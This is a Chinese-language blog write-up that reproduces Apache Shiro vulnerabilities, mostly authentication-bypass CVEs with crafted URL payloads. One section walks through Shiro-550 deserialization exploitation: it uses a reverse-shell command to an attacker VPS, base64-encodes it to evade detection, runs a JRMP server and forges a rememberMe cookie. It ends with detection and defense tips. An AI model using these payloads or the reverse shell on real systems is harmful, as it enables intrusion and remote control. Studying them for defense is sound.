Shiro漏洞复现

发表于2023-07-24|更新于2023-10-14|技术
|阅读量:

CVE-2010-3863

  • Shiro < 1.1.0
  • JSecurity 0.9.X
  • 认证失效

未登录访问/admin将跳转到login.jsp,使用/./admin即可绕过验证

整个过程并没有对路径进行标准化处理(去除路径中的/./、\\以及其他一些特殊符号)导致直接./绕过

CVE-2014-0074/Shiro-460

  • Shiro < 1.2.3
  • 空白名登录

漏洞利用

处理payload

我们想通过shiro550进行反弹shell，首先对利用payload进行处理：
反弹shell命令:bash -i >& /dev/tcp/vpsip/6666 0>&1
当命令中包含重定向 ’ < ’ ’ > ’ 和管道符 ’ | ’ 时，需要进行 base64 编码绕过检测

起JRMP服务

有了payload，需要受害机能够通过shiro序列化并请求该payload，我们在1984端口起JRMP服务，一并放入base64编码后的payload(记得服务器放行该端口)

运行POC.py

另起 一个窗口,运行

修改rememberMe

bp抓包修改cookie处rememberMe为POC.py生成的值发包,发现JRMP过来了流量,受害机器成功送出shell,这边nc也正常接收

漏洞原理

shiro提供rememberMe功能,它的值为原始数据的base64编码并使用AES加密,加密AES密钥又被硬编码在源码当中,攻击者拿到该密钥后,可以使用不同的Commons Collection链进行rce等利用攻击

CVE-2016-6802

  • Shiro < 1.3.2
  • 未标准化路径导致访问绕过

CVE-2020-1957/Shiro-682

  • 特制请求绕过
  • Shiro < 1.5.2

访问/index会被限制，而在后面加上/，则可以绕过访问限制

这是由于Spring-Web和Shiro的访问路径的不同处理造成的，在Spring-Web中，/resource/menus和/resource/menus/都可以访问资源，而在Shiro中，只有/resource/menus才会匹配上pathPattern从而进行身份验证和授权之类的操作。

另一个绕过，利用的是Shiro和Spring-Web对url中的;处理的差别来绕过校验。
Shiro配置中将/abc/admin设置成了需要认证才能访问

POC：/abc;bbb/admin

漏洞原理

550后shiro将AES密钥改为随机的,爆破不太现实,但是仍旧可以通过登录用户的rememberMe值利用padding oracle来爆破aes的key,从而实现命令执行

CVE-2020-13933

  • Shiro < 1.6.0
  • 特制的HTTP请求可能导致认证绕过
  • 利用SpringWeb和Shiro处理方式的差异进行绕过

在Shiro中，先解码、后处理分号，然后再标准化路径
在SpringWeb中，先处理分号，再解码，然后标准化路径

两个步骤的差距，可以导致绕过
将;编码成%3b

  1. 在Shiro中，他会先解码成分号然后截取分号前的内容
  2. 在SpringWeb中，首先他找不到分号，因为分号已经被编码成%3b，相当于他不会处理分号，然后他才将分号解码

使用;去绕过一些需要认证的路径，只要他截取的分号前的内容设置了不需要验证即可
/admin/*需要认证才能访问，而我们通过加个%3b，即/admin/%3bxx，在Shiro中，他会解码成分号，然后截取分号前的内容，即/admin/，这里就绕过了Shiro的过滤器，在后续Spring-Web处理中，该路径被处理成/admin/;xx就成功访问到了controller

修复

Shiro新增了个全局过滤器，为InvalidRequestFilter
这个类InvalidRequestFilter会检测uri是否存在分号、反斜杠以及非ASCII码字符，若检测到就会返回状态码400，消息为Invalid request

CVE-2020-17510

  • Shiro < 1.7.0
  • 与Spring一起使用Apache Shiro时，特制的HTTP请求可能导致认证绕过

SpringWeb和Shiro的处理.的差异造成绕过,.号编码为%2e

Shiro和SpringWeb对待编码后的点号是怎么处理的呢？

在Shiro中，它会先解码成.，不需要处理分号，然后标准化路径去掉.
而在Spring-Web中，首先无需处理分号，然后将%2e解码成.号，在getSanitizedPath也未处理.号
所以可以使用编码后的点号进行绕过，同样也是设置/admin/*需要认证才能访问，此时我们加上%2e，变成/admin/%2e；

在Shiro中，处理成/admin/，无法匹配/admin/*而造成绕过
在Spring中，处理成/admin/.，成功访问到了/admin下的路由

CVE-2020-17523

  • Shiro < 1.7.1
  • 再次通过空格编码绕过

设置/admin/*需要认证才能访问，我们使用/admin/%20，经过Shiro他会处理成/admin/，匹配不上/admin/*从而导致绕过

CVE-2022-32532

  • Shiro < 1.9.1
  • RegexRequestMatcher可能被错误配置，导致在一些servlet容器上被绕过。使用RegExPatternMatcher的正则表达式中含有.的应用程序可能会受到权限绕过的影响

当配置了需要认证的路径为/admin/.*，而在正则表达式中元字符.是匹配除换行符（\n、\r）之外的任何单个字符，\r的URL编码为%0d，\n的URL编码为%0a，所以可以使用/admin/%0d或者/admin/%0a，这样就无法匹配/admin/.*从而绕过认证

告警分析

数据包内有rememberMe字段
尝试解密rememberMe，查看是否调用了一些敏感值Commons Collection的transformer等，解密网站

漏洞防御

升级shiro为最新版本
限制rememberMe长度,过长拦截
对于721,由于需要多次访问进行爆破,因此可以封禁短时间内多次访问的IP
